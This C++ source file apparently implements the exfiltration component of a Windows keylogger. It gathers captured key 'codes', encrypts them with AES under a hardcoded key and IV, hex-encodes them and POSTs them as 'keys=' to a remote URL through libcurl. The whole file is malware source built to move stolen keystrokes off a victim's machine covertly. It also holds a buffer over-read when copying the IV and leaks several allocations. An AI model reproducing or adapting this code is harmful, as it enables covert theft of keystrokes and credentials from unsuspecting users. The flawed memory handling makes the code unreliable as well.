#define CURL_STATICLIB

#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <iterator>
#include <algorithm>
#include <Windows.h>
#include <bcrypt.h>
#include <curl/curl.h>
#include "connections_pivoter.h"
#include "base64.h"

#pragma comment (lib, "Normaliz.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Wldap32.lib")
#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib, "advapi32.lib")
#pragma comment (lib, "User32.lib")

std::string join(std::vector<std::string> v) {
	std::stringstream ss; 
	std::copy(v.begin(), v.end(),
		std::ostream_iterator<std::string>(ss, " "));

	return ss.str();
}

// RESOURCE: https://curl.se/libcurl/c/
ConnectionsPivoter::ConnectionsPivoter(std::string url) {
	this->url = url; 

	curl_global_init(CURL_GLOBAL_ALL);
	this->curl = curl_easy_init();
}

ConnectionsPivoter::ConnectionsPivoter() {
	curl_global_init(CURL_GLOBAL_ALL);
	this->curl = curl_easy_init(); 
}

BOOL ConnectionsPivoter::send_alive_signal() {
	return TRUE; 
}

static const BYTE iv[] = {
	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 
	0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
}; 

static const BYTE key[] = {
	0x6B, 0x28, 0x31, 0x33, 0x23, 0x21, 0x31, 0x39, 
	0x21, 0x4C, 0x6C, 0x34, 0x24, 0x31, 0x22, 0x39
}; 

BOOL ConnectionsPivoter::send_codes(std::vector<std::string> codes) {
	if (!this->curl)
		return false;

	curl_easy_setopt(this->curl, CURLOPT_URL, this->url.c_str());
	std::string keys_message = join(codes); 

	size_t encrypted_message_length = -1; 
	PBYTE encrypted_message = encrypt_traffic(keys_message, &encrypted_message_length); 

	DWORD output_length = 0; 
	LPVOID output_string = NULL; 
	CryptBinaryToStringA(encrypted_message, encrypted_message_length, CRYPT_STRING_HEXRAW, NULL, &output_length); 

	output_string = HeapAlloc(GetProcessHeap(), 0, output_length); 

	CryptBinaryToStringA(encrypted_message, encrypted_message_length, CRYPT_STRING_HEXRAW, (LPSTR) output_string, &output_length);

	keys_message = curl_easy_escape(this->curl, (const char*) output_string, output_length);
	keys_message = "keys=" + keys_message; 
	curl_easy_setopt(this->curl, CURLOPT_POSTFIELDS, keys_message.c_str());

	CURLcode res = curl_easy_perform(this->curl); 

	if (res != CURLE_OK)
		return false; 

	return true; 
}

std::vector<BYTE> extract_bytes(std::string data_message) {
	std::vector<BYTE> output = std::vector<BYTE>(); 

	for (int i = 0; i < data_message.size(); i++)
		output.push_back((int) data_message.at(i)); 

	return output; 
}

PBYTE ConnectionsPivoter::encrypt_traffic(std::string data, size_t *output_length) {
	std::vector<BYTE> plaintext_message = extract_bytes(data); 

	NTSTATUS status;
	BCRYPT_ALG_HANDLE alg_handle; 
	BCRYPT_KEY_HANDLE key_handle; 
	DWORD 
		key_object_length, 
		cipher_block_length,
		status_bytes,
		key_blob_length,
		plaintext_length, 
		ciphertext_length; 
	PBYTE 
		key_object, 
		iv_bytes, 
		plaintext_bytes, 
		ciphertext_bytes; 
	

	status = BCryptOpenAlgorithmProvider(&alg_handle, BCRYPT_AES_ALGORITHM, NULL, 0); 

	if (status < 0) {
		std::cout << "Error opening an alg provider" << std::endl; 
		return NULL; 
	}

	status = BCryptGetProperty(alg_handle, BCRYPT_OBJECT_LENGTH, (PBYTE)&key_object_length, sizeof(DWORD), &status_bytes, 0); 

	if (status < 0) {
		std::cout << "Error getting the length of the key object" << std::endl;
		return NULL;
	}

	key_object = (PBYTE)HeapAlloc(GetProcessHeap(), 0, key_object_length);

	if (NULL == key_object) {
		std::cout << "Failed allocating memory for the key object" << std::endl;
		return NULL;
	}

	status = BCryptGetProperty(alg_handle, BCRYPT_BLOCK_LENGTH, (PBYTE)&cipher_block_length, sizeof(DWORD), &status_bytes, 0);

	if (status < 0) {
		std::cout << "Failed getting cipher block length property" << std::endl;
		return NULL;
	}

	if (cipher_block_length > sizeof(iv)) {
		std::cout << "cipher block length bigger than the size of the iv" << std::endl; 
		return NULL; 
	}

	iv_bytes = (PBYTE)HeapAlloc(GetProcessHeap(), 0, key_object_length); 
	if (NULL == iv_bytes) {
		std::cout << "Failed allocating memory for the iv" << std::endl; 
		return NULL; 
	}

	memcpy(iv_bytes, iv, key_object_length); 

	status = BCryptSetProperty(alg_handle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

	if (status < 0) {
		std::cout << "Error getting the cbc chaining property" << std::endl;
		return NULL;
	}

	status = BCryptGenerateSymmetricKey(alg_handle, &key_handle, key_object, key_object_length, (PBYTE)key, sizeof(key), 0); 

	if (status < 0) {
		std::cout << "Failed to generate the key" << std::endl;
		return NULL;
	}

	status = BCryptExportKey(key_handle, NULL, BCRYPT_OPAQUE_KEY_BLOB, NULL, 0, &key_blob_length, 0);

	if (status < 0) {
		std::cout << "Failed exporting the key as blob" << std::endl; 
		return NULL; 
	}

	plaintext_length = plaintext_message.size();
	plaintext_bytes = (PBYTE)HeapAlloc(GetProcessHeap(), 0, plaintext_length); 
	
	if (NULL == plaintext_bytes) {
		std::cout << "Failed allocating heap memory for the plaintext" << std::endl;
		return NULL; 
	}

	memcpy(plaintext_bytes, plaintext_message.data(), plaintext_length);
	
	status = BCryptEncrypt(key_handle, plaintext_bytes, plaintext_length, NULL, iv_bytes, cipher_block_length, NULL, 0, &ciphertext_length, BCRYPT_BLOCK_PADDING);

	if (status < 0) {
		std::cout << "Failed getting the size for the ciphertext" << std::endl; 
		return NULL; 
	}

	ciphertext_bytes = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ciphertext_length); 

	if (NULL == ciphertext_bytes) {
		std::cout << "Failed to allocate heap memory for the ciphertext" << std::endl;
		return NULL; 
	}

	status = BCryptEncrypt(key_handle, plaintext_bytes, plaintext_length, NULL, iv_bytes, cipher_block_length, ciphertext_bytes, ciphertext_length, &status_bytes, BCRYPT_BLOCK_PADDING);

	if (status < 0) {
		std::cout << "Failed encrypting" << std::endl; 
		return NULL; 
	}


	*(output_length) = ciphertext_length; 
	return ciphertext_bytes; 
}
